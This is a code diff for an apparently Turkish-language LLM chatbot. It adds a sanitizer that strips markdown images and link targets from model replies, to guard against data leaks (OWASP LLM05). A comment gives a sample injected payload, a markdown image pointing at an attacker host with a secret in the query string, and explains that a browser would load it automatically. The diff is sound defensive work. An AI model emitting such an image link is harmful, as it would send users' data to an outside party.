@@ -1,3 +1,4 @@
+import re
 from dataclasses import dataclass, field
 
 from langfuse import get_client, observe, propagate_attributes
@@ -14,6 +15,17 @@ from rolchat.tools import Deps
 REFUSAL = "Bu konuda bilgim yok."
 # Unbounded consumption (OWASP LLM10): a runaway tool loop stops after a few model requests.
 USAGE_LIMITS = UsageLimits(request_limit=5)
+
+# Improper output handling (OWASP LLM05): a markdown image is loaded by the browser on its own, so an
+# injected ![x](https://attacker/?d=SECRET) would leak data. Drop images, keep only the text of links.
+_DEST = r"\((?:[^()]|\([^()]*\))*\)"  # (url), allowing one level of nested parentheses
+_IMAGE = re.compile(r"!\[[\s\S]*?\](?:" + _DEST + r"|\[[^\]]*\])")
+_LINK = re.compile(r"\[([^\]]*)\]" + _DEST)
+_REF_DEF = re.compile(r"^ {0,3}\[[^\]]+\]:.*$", re.MULTILINE)
+
+
+def sanitize(text: str) -> str:
+    return _REF_DEF.sub("", _LINK.sub(r"\1", _IMAGE.sub("", text)))
 
 
 @dataclass
@@ -37,6 +49,7 @@ async def answer(
     # Everything under this trace (guardrail, LLM calls, tool calls) is tagged with the role.
     with propagate_attributes(user_id=role, session_id=session_id, tags=[f"rol:{role}"]):
         reply = await _answer(text, role, history, engines, guard)
+    reply.text = sanitize(reply.text)
     langfuse = get_client()
     langfuse.update_current_span(
         input=text,
